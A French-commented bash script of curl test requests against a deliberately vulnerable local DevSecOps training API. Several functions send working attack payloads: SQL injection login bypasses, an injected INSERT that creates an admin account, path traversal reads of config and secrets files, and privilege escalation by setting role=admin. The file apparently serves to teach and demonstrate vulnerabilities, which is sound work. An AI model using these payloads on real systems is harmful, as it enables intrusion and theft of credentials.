#!/bin/bash
# Exemples de requêtes curl pour tester l'API DevSecOps
# Usage : ./curl-examples.sh <nom_de_la_fonction>
# Ou exécuter les fonctions individuellement

BASE_URL="http://localhost:3000"

# Couleurs pour l'affichage
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

function print_title() {
  echo -e "\n${BLUE}========================================${NC}"
  echo -e "${BLUE}$1${NC}"
  echo -e "${BLUE}========================================${NC}\n"
}

function print_success() {
  echo -e "${GREEN}✓ $1${NC}"
}

function print_error() {
  echo -e "${RED}✗ $1${NC}"
}

###############################################################################
# Health Check
###############################################################################

function health() {
  print_title "Health Check"
  curl -X GET "$BASE_URL/api/health"
  echo -e "\n"
}

###############################################################################
# Login - Normal
###############################################################################

function login_normal() {
  print_title "Login Normal (admin/admin123)"
  curl -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{
      "username": "admin",
      "password": "admin123"
    }'
  echo -e "\n"
}

###############################################################################
# Login - SQL Injection
###############################################################################

function login_sqli() {
  print_title "Login SQL Injection (admin' --)"
  echo -e "${RED}🚨 Exploitation : Bypass du mot de passe avec SQL Injection${NC}\n"
  curl -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{
      "username": "admin'\'' --",
      "password": "nimportequoi"
    }'
  echo -e "\n"
}

function login_sqli_or() {
  print_title "Login SQL Injection (OR 1=1)"
  echo -e "${RED}🚨 Exploitation : OR 1=1 toujours vrai${NC}\n"
  curl -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{
      "username": "admin'\'' OR '\''1'\''='\''1",
      "password": "test"
    }'
  echo -e "\n"
}

###############################################################################
# Files - Normal
###############################################################################

function file_normal() {
  print_title "GET File Normal (photo.jpg)"
  curl -X GET "$BASE_URL/api/files?name=photo.jpg"
  echo -e "\n"
}

###############################################################################
# Files - Path Traversal
###############################################################################

function file_traversal_package() {
  print_title "Path Traversal - package.json"
  echo -e "${RED}🚨 Exploitation : Accès à package.json avec ../${NC}\n"
  curl -X GET "$BASE_URL/api/files?name=../package.json"
  echo -e "\n"
}

function file_traversal_env() {
  print_title "Path Traversal - .env.example"
  echo -e "${RED}🚨 Exploitation : Accès à .env.example${NC}\n"
  curl -X GET "$BASE_URL/api/files?name=../.env.example"
  echo -e "\n"
}

function file_traversal_db() {
  print_title "Path Traversal - database.js (credentials hardcodés)"
  echo -e "${RED}🚨 Exploitation : Lecture du code source avec credentials${NC}\n"
  curl -X GET "$BASE_URL/api/files?name=../src/config/database.js"
  echo -e "\n"
}

function file_traversal_secrets() {
  print_title "Path Traversal - SECRETS_EXAMPLES.md"
  echo -e "${RED}🚨 Exploitation : Accès aux exemples de secrets${NC}\n"
  curl -X GET "$BASE_URL/api/files?name=../SECRETS_EXAMPLES.md"
  echo -e "\n"
}

###############################################################################
# Users - Normal
###############################################################################

function user_create() {
  print_title "Create User Normal"
  curl -X POST "$BASE_URL/api/users" \
    -H "Content-Type: application/json" \
    -d '{
      "email": "test@example.com",
      "password": "testpassword",
      "role": "user"
    }'
  echo -e "\n"
}

###############################################################################
# Users - Privilege Escalation
###############################################################################

function user_privilege_escalation() {
  print_title "Privilege Escalation - Se donner le rôle admin"
  echo -e "${RED}🚨 Exploitation : Création d'un compte admin${NC}\n"
  curl -X POST "$BASE_URL/api/users" \
    -H "Content-Type: application/json" \
    -d '{
      "email": "hacker@evil.com",
      "password": "test",
      "role": "admin"
    }'
  echo -e "\n"
}

###############################################################################
# Users - SQL Injection
###############################################################################

function user_sqli() {
  print_title "Users SQL Injection"
  echo -e "${RED}🚨 Exploitation : SQL Injection dans l'email${NC}\n"
  curl -X POST "$BASE_URL/api/users" \
    -H "Content-Type: application/json" \
    -d '{
      "email": "hacker'\'', '\''hacker@evil.com'\'', '\''hacked123'\'', '\''admin'\''); --",
      "password": "test",
      "role": "user"
    }'
  echo -e "\n"
}

###############################################################################
# Users - Pas de validation
###############################################################################

function user_no_validation() {
  print_title "Users - Pas de validation"
  echo -e "${RED}🚨 Exploitation : Email invalide + mot de passe faible${NC}\n"
  curl -X POST "$BASE_URL/api/users" \
    -H "Content-Type: application/json" \
    -d '{
      "email": "pas-un-email",
      "password": "x",
      "role": "superadmin"
    }'
  echo -e "\n"
}

###############################################################################
# Menu interactif
###############################################################################

function menu() {
  echo -e "\n${BLUE}=== API DevSecOps - Tests ===${NC}\n"
  echo "1)  Health Check"
  echo "2)  Login Normal"
  echo "3)  Login SQL Injection (admin' --)"
  echo "4)  Login SQL Injection (OR 1=1)"
  echo "5)  File Normal (photo.jpg)"
  echo "6)  Path Traversal - package.json"
  echo "7)  Path Traversal - .env.example"
  echo "8)  Path Traversal - database.js"
  echo "9)  Path Traversal - SECRETS_EXAMPLES.md"
  echo "10) Create User Normal"
  echo "11) Privilege Escalation (role=admin)"
  echo "12) Users SQL Injection"
  echo "13) Users No Validation"
  echo "14) Tout exécuter"
  echo "0)  Quitter"
  echo ""
  read -p "Choisissez un test : " choice

  case $choice in
    1) health ;;
    2) login_normal ;;
    3) login_sqli ;;
    4) login_sqli_or ;;
    5) file_normal ;;
    6) file_traversal_package ;;
    7) file_traversal_env ;;
    8) file_traversal_db ;;
    9) file_traversal_secrets ;;
    10) user_create ;;
    11) user_privilege_escalation ;;
    12) user_sqli ;;
    13) user_no_validation ;;
    14) run_all ;;
    0) exit 0 ;;
    *) echo "Choix invalide" ;;
  esac
}

function run_all() {
  health
  login_normal
  login_sqli
  login_sqli_or
  file_normal
  file_traversal_package
  file_traversal_env
  file_traversal_db
  user_create
  user_privilege_escalation
  user_sqli
  user_no_validation
}

# Si aucun argument, afficher le menu
if [ $# -eq 0 ]; then
  while true; do
    menu
  done
else
  # Sinon, exécuter la fonction passée en argument
  $1
fi
